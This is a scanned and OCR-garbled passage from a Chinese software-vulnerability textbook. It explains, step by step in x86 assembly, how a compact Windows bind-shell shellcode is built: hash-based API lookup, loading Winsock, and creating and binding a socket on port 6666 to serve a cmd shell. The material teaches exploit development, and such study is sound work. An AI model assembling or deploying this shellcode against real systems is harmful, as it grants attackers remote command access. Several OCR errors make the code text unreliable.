bind
0x30
listen
0x20
accept
0x41
inc ecx
这里顺便看一下字符串“cmd”紧跟在hash值后面会对程序执行有什么影响。在调用
CreateProcessA的时候，我们需要这个字符串作参数来得到一个命令行的shell。已知这个调用
等价的，如表3-6-2所示。
表3-6-2ASCII字值及其机器码对应的指令
ASCII字符
ASCII值（机器码）
机器码对应的指令
C（大写）
0x43
inc ebx
M（大写）
0x4d
dec ebp
d（小写）
0x64
:Sd
0x64对应的是取指前缀，就是告诉处理器取指令的时候去FS段中的地址里取。由于大多
数情况只是要执行下一条指令，所以前缀是多余的，并且会被处理器忽略。因此，字符串“CMd”
也将被处理器当做指令“不疼不痒”地执行过去。
3.6.3191个字节的bindshell
在优化完hash算法之后，还需要把hash过的函数名变成真正的函数地址。有两种思路：
候再去解析它。这两种方案各有利弊，需要视具体情况而定，这里采用第一种方案。
我们准备把解析出的函数地址存于栈中shellcode的“上”边（内存低址）。由于是通过调
用ExitProcess退出程序，所以不用担心堆栈平衡等内存细节。
107
---
## Page 133
0
day
一共有8个函数地址，地址为双字，每个4字节，共32个字节。我们将从hash摘要前的
安
24个字节的地方开始存储函数地址，这意味着最后两个函数地址将写入hash值的区域，而且
全
刚好在字符串“cmd”之前结束（8个函数名的hash值，共8字节）。稍后就会明白，这样做是
：
因为可以用寄存器中指向“cmd”的指针来调用CreateProcessA。
软
件
之后用lodsb指令来读取hash值、stosd指令来存储函数地址，为此需要把esi指向hash
漏
值、edi指向函数地址的存储位置。由于这时eax中的值相对比较小（指向栈中的某一个位置），
洞
所以还可以利用单字节指令cdg给edx置0。
分
析
cdq
;setedx0
技
xchg eax,esi
;esi=addr of first function hash
术
leaedi,[esi-0x18]
:edi= addr to start writing function
（第
我们需要的函数来自于两个动态链接库文件：kemel32.dll和ws2_32.dll。由于ws2_32.dll
2
还没有被装载，而每一个Windows的进程都会装载kemel32.dll，所以先从它开始。这里仍然
版
用上节介绍的读取PEB中动态链接库初始化列表的经典方法来获得动态链接库的基址。
这里要循环执行8次地址定位才行。当kermel32.dll中的函数地址全都被找到的时候，需要
调用LoadLibrary（“ws2_32"），然后用获得的基址去定位Winsock需要的其他函数。所以，在
8次地址定位过程中还要加一次基地址切换。
当后面调用wSAStartup函数的时候，为了避免内存错误，我们还需要一个比较大块的栈
空间来初始化WSADATA结构体。此刻，edx中的值是null，我们在栈中存储字符事“ws2_32”
及其指针的代码如下：
sub esp,edx
：栈顶拍高0x0300
moVdx，0x3233：0x32是ASCII字符‘2'，0x33是字符‘3’
push edx
：edx此时的内容为0x00003233，压栈后内存由低到高的
：方向为0x33320000
push 0x5f327377
：压栈后，内存由低到高（栈顶向栈底）为
：0x7773325f33320000，就是“ws2_32
push esp
：此时的esp指向字符串“ws2_32”
假设解析函数地址时ebp中存储着动态链接库的基址，esi指向下一个函数名的hash值，
edi指向下一个函数入口地址应该存放的位置。
在读入hash值之后，需要找到函数导出表。
find_lib_functions:
lodsb
:load nexthash into al
find_functions:
pushad
:preserve registers
mov eax，[ebp+0x3c]
;eax=start of PE header
movecx,[ebp+eax+0x78]
;ecx=relative offset of export
;table
108
---
## Page 134
第
add ecx,ebp
;ecx=absolute addr of export table
3
movebx,[ecx+ 0x20]
;ebx= relative offset of names table
章
add ebx,ebp
:ebx=absolute addr ofnames table
xor edi,edi
:edi will count through the functions
开
然后，在循环中计算导出表中所有函数名的hash值。
发
shellcode
next_function_loop:
inc edi
;increment function counter
mov esi,[ebx+edi*4]
;esi= relative offset of current
;function name
add esi,ebp
的
;esi=absolute addr of current
:function name
术
cdq
x o    
;smal1)
hash_loop:
lodsb
;load next char into al
xor al,0x71
;XoR current char with 0x71
sub dl,al
:update hash with current char
cmp al,0x71
;loop untilwe reachendof string
jne hash_loop
之后比较导出表中每一个函数名hash后得到的摘要，从而找出它们的地址。我们使用的
shellcode装载程序假定eax指向shellcode的起始地址，且shellcode的起始正是存放所需函数
hash摘要的地方，但在pushad指令保存所有寄存器状态之后，eax将被改写，而eax原值存储
在栈中esp+Oxlc的地方，所以需要把计算出的hash值与esp+Oxlc所指的hash值相比较。
cmpdl,[esp+0xlc]
:compare to the requested hash
jnz next_function_loop
当跳出next_function_loop的时候，用edi作为计数器，里边所记录的循环次数就是函数偏
移地址表中的位置，剩下的就是顺藤摸瓜找出这个函数的入口地址了。
movebx,[ecx+0x24]
:ebx=relative offsetof ordinals table
add ebx,ebp
;ebx=absolute addr of ordinals
:table
movdi,[ebx+2*edi]
;di=ordinal number of matched
:function
mov ebx,[ecx+0x1c]
;ebx=relativeoffsetofaddress table
add ebx,ebp
;ebx =absolute addr of address table
addebp，[ebx+4*edi]
:add to ebp （base addr of module)the
:relative offset of matched function
现在ebp中已经存放着所需的函数地址了，然而我们希望这个地址由edi中的指针引用。
可以用stosd把地址存到那里，但是需要首先恢复edi的原始值。下面这几行代码虽然看起来有
109
---
## Page 135
0
day
点不合常理，但却能够完成这个任务，并且只需要4个字节。
安
xchg eax,ebp
;move func addr into eax
全
popedi
;edi is last onto stack in pushad
：
;write function addr to[edi]
软
件
push edi
:restore thestackready for popad
漏
现在已经能够完成一个函数名hash对应的入口地址的解析了。我们需要保存寄存器状态，
洞
然后继续循环执行，直到所需的8个函数名的hash都被解析出来。回忆一下前面是怎样存放
分
这些函数地址的？对了，最后一个函数地址将准确地把存放函数名hash的地方覆盖掉（后面
析
技
是“cmd"字符串），所以我们可以通过判断esi和edi两个寄存器中指针的相同来结束用于API
术
定位的循环体。
（第
pedod
2
cmp esi,edi
版
jne find_iib_functions
这差不多就是解析API入口地址的全过程，唯一欠缺的就是从kermel32.dll切换到
ws2_32.dll中去解析函数地址了。当搞定前三个函数地址的时候，在执行find_functions之前加
入下面几行代码来做到动态连接库的切换。
cmp al,0xd3
:hash of wSAStartup
jne find_functions
xchg eax,ebp
:save current hash
call{edi-0xc]
;LoadLibraryA
xchg eax,ebp
;restore current hash,and update ebp
:withbaseaddressofws2_32.dl1
push edi
;save location of addr of first
Winsockfunction
注意：这时指向字符串“ws2_32"的指针恰好在栈顶，所以可以直接调用LoadLibraryA。
获得了这些函数地址之后，我们需要恰当地调用这些Winsock相关的函数。
首先需要调用WSAStartup来初始化Winsock。前面已经说过在解析函数的同时就把函数
地址存在了栈中，并且是按照调用顺序存放的。因此，可以把函数地址装入esi，然后用lodsd/call
eax来调用每一个需要的Winsock函数。
wSAStartup函数有两个参数。
int wSAStartup（
WORDwVersionRequested,
LPWSADATA
lpwSAData
我们用栈区存储WSADATA结构体。由于这是一个[out]参数，且用于函数回写返回值，故
不需要专门去初始化这个结构体。前边我们已经为自己开辟了足够大的栈空间，所以这里只要
110
---
## Page 136
第
让这个结构体指针指向栈内一块空闲的区域，别让函数在回写返回值的时候冲掉有用的数据或
3
者shellcode就行。
章
popesi
:location of first Winsock function
开
dsa usnd
:lpWSAData
发
push 0x02
;wVersionRequested
shellcode
lodsd
call eax;WSAStartup
WSAStartup返回o代表Winsock初始化成功（如果非0，也就不用指望其余的代码能够成
功运行了）。所以在eax中我们又有一个睡手可得的NULL用来做其他事情了。字符串“cmd”
的
艺
后面需要NULL作为字符串的结束：其他Winsock函数的参数中有不少也是NULL。如果现在
术
我们把栈中一大片区域都置成NULL，那么在调用这些函数的时候就可以省去好几条对NULL
的压栈指令。
除此以外，在调用CreateProcessA的时候我们只要对这片为NULL的栈区稍作“点缀”
就可以初始化出一个STARTUPINFO结构体。
lea ecx,[eax+0x30]
movedi,esp
WSASocket函数有6个参数。
SOCKET WSASocket(
int af,
int type,
int protocol,
LPWSAPROTOCOL_INFOlpProtocolInfo
GROUPg.
DWORD dwFlags
我们只关心前两个参数，其余的都将设置NULL。对于af参数，这里将传入2（AF_INET），
对于type，传入1（SOCK_STREAM)。由于栈区已经被初始化成NULL，所以其余的NULL
参数压栈操作都可以省去了。
此外函数将返回一个socket，在后面的调用中（bind等）还要用到它。由于这里的API调用
都不会修改ebp的值，所以我们可以用单字节的指令xchgebp，eax把返回的socket保存在ebp
中，而不是用两个字节的压栈指令存入栈中。
inc eax
push eax
;tyPe=1（SOCK_STREAM）
inc eax
push eax
af=2（AF_INET）
lodsd
111
---
## Page 137
0
day
calleax
;WSASocketA
安
xchg ebp,eax
;saveSoCKETdescriptorinebp
全
下面要让得到的socket监听客户端的连接，也就是调用bind函数，它有3个参数。
：
软
int bind（
件
SOCKET
S,
漏
const struct
sockaddr* name
洞
int
namelen
分
析
作为一个普通的程序员，通常可能会认为要正确地调用bind函数，首先需要完成以下工作。
技
术
（1）创建并初始化一个sockaddr结构体。
（第
（2）把结构体的大小压入栈中。
（3）把结构体的指针压入栈中。
2
（4）把socket压入栈中。
版
如果打破这种常规的思维方式，我们可以做得更巧妙。
首先，大多数结构体的名字都允许为空，所以只用关心sockaddr中前两个成员变量。
short sin_family:
u_shortsin_port;
其次，指明结构体大小的参数不一定真的就是精确的结构体长度。前面已经说过，只要这
个参数足够大就行。所以这里将用0x0ala0002作为指明结构体的大小的参数。其中，0x1a0a
是十进制的6666，后面会被再次用作端口号：0x02则还可用作指明AF_INET。不巧的是，这
个0x0a1a0002中包含一个字节的null，所以不能直接引用这个DWORD，必须用点心思巧妙地
把它构造出来。
mov eax,0x0alaff02
xor ah,ah
:remove the ff
push eax
:"length*ofour structure,and itsfirst two
;members
push esp
pointer to our structure
pushebp
;saved SocKET descriptor
lodsd
call eax
;bind
结构体中其他为NULL的部分就不用我们再去操心了，因为整个栈都已经被置成了NULL。
后面还需要调用listen和accept函数，这两个函数的定义如下。
int listen(
SOCKET